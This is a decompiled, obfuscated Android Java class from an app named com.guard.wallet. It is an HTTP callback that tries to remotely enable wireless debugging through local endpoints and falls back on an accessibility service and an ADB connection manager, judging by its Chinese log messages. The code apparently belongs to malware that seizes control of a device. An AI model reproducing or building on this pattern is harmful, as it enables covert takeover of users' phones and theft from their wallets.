package com.guard.wallet.http;

import a1.AbstractC0026q;
import android.util.Log;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0246b;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.IOException;
import p0.InterfaceC0863e;
import p0.f0;
import p0.j0;
import p0.l0;
import p005h.C0318e;
import p015s.C0897b;

/* renamed from: com.guard.wallet.http.r */
/* loaded from: classes.dex */
public final class C0213r implements InterfaceC0863e {
    @Override // p0.InterfaceC0863e
    /* renamed from: b */
    public final void mo389b(p0.e0 e0Var, IOException iOException) {
        AbstractC0026q.m186s("OpenWifiDebugCallback", iOException);
        if ((iOException instanceof C0897b) || AbstractC0026q.m151B(e0Var.f1773c.f1777a.f1914h)) {
            return;
        }
        f0 f0Var = e0Var.f1773c;
        C0204i.m400c(f0Var.f1777a.f1914h);
        if (f0Var.f1777a.f1914h.contains("127.0.0.1:7911")) {
            AbstractC0207l.m430m("http://127.0.0.1:7912");
            return;
        }
        if (C0318e.m844S() != null) {
            C0318e m844S = C0318e.m844S();
            m844S.getClass();
            Log.d("AdbConnectionManager", "未配对、无障碍服务监听窗口初始化未完成,无法请求远程开启无线调试");
            if (MyAccessibilityService.m554P() == null) {
                AbstractC0246b.m600e();
            } else {
                m844S.m860U();
            }
        }
    }

    @Override // p0.InterfaceC0863e
    /* renamed from: d */
    public final void mo390d(p0.e0 e0Var, j0 j0Var) {
        f0 f0Var = e0Var.f1773c;
        C0204i.m400c(f0Var.f1777a.f1914h);
        l0 l0Var = j0Var.f1835g;
        if (l0Var != null) {
            try {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(l0Var.m1269z(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.http.OpenWifiDebugCallback$1
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && ((Boolean) apiResult.getData()).booleanValue()) {
                    Log.d("OpenWifiDebugCallback", "开启无线调试成功");
                } else if (!AbstractC0026q.m151B(f0Var.f1777a.f1914h) && f0Var.f1777a.f1914h.contains("127.0.0.1:7911")) {
                    AbstractC0207l.m430m("http://127.0.0.1:7912");
                } else if (C0318e.m844S() != null) {
                    C0318e m844S = C0318e.m844S();
                    m844S.getClass();
                    Log.d("AdbConnectionManager", "未配对、无障碍服务监听窗口初始化未完成,无法请求远程开启无线调试");
                    if (MyAccessibilityService.m554P() == null) {
                        AbstractC0246b.m600e();
                    } else {
                        m844S.m860U();
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("OpenWifiDebugCallback", e2);
            }
        }
        j0Var.close();
    }
}
